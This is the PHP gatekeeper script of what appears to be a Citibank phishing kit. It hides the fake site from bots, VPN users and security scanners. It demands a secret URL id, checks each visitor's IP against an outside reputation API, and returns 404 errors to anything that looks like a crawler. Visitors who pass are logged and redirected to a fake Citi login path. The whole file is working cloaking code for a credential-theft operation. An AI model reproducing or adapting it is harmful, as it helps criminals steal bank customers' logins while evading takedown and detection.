<?php 
session_start();
require 'prevents/main.php';
include('prevents/detects.php');
include'admin/YOUR-CONFIG.php';
if($block_vpn == "on") {
    require_once 'prevents/proxyblock.php';
}

$CITI_SESSION = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));

 if ($redirection=="yes") {
	if (isset($_GET['id'])) {
	 $id = isset($_GET['id']) ? trim(htmlentities($_GET['id'])):'';
	  if ($id !== $redirect) {
	  	header("HTTP/1.0 404 Not Found");
		exit();
	  }
	}else{
		header("HTTP/1.0 404 Not Found");
		exit();
	}
  }
  



if ($anti_bot=="yes") {
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, "https://api.iptrooper.net/check/$ip?full=1");
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $result = curl_exec($ch);
 $result = json_decode($result);
 
 //define all array
 $asn ="$result->asn";
 $bad = "$result->bad";
 $code = "$result->code";
 $country ="$result->country";
 $ipaddress ="$result->ipaddress";
 $name="$result->name";
 $type="$result->type";

 
if ($result->type=='valid') {
            
            $content = "#> [".$ip."] [ ".$date." ] - [ ".$os." ] \r\n";
		    $save=fopen("visit_log.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			$_SESSION['CITI_SPOX'] = $CITI_SESSION;
			exit(header("Location: login?/.jsp/efs/servlet/efs/"));	
			
 }
 else{
		    $content = "#> [".$ip."] [ ".$date." ] - [.$type.] \r\n";
		    $save=fopen("bots.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			header("HTTP/1.0 404 Not Found");exit();
 }
}
?>